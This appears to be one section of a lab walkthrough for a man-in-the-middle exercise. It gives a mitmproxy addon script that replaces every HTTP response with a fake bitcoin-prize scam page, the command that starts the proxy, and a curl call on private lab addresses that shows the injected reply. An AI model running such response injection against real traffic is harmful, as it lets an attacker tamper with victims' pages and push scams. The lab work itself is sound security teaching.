# 5. Man-In-The-Middle
First we configure and start the mitmproxy on **MITM**.

To replace the content of a response we add a small python script and pass it to mitmproxy.
```bash
cat << EOF > injection.py
from mitmproxy import http


def response(flow: http.HTTPFlow) -> None:
    flow.response.content = "<h1>You won!</h1><div>Claim your prize of 10 bitcoins at scam.com</div>".encode("utf-8")
EOF
```
The proxy can then be started:
```bash
mitmproxy -s "injection.py" 
```
On the **client** site can be accessed over the proxy by setting an environment variable when calling curl.
```bash
root@client:~# http_proxy=10.0.6.1:8080 curl 192.168.1.100:8080
<h1>You won!</h1><div>Claim your prize of 10 bitcoins at scam.com</div>
```
The proxy successfully injected its own response into the reply.

Mitmproxy can be exited by entering "q" and then "y" into the terminal.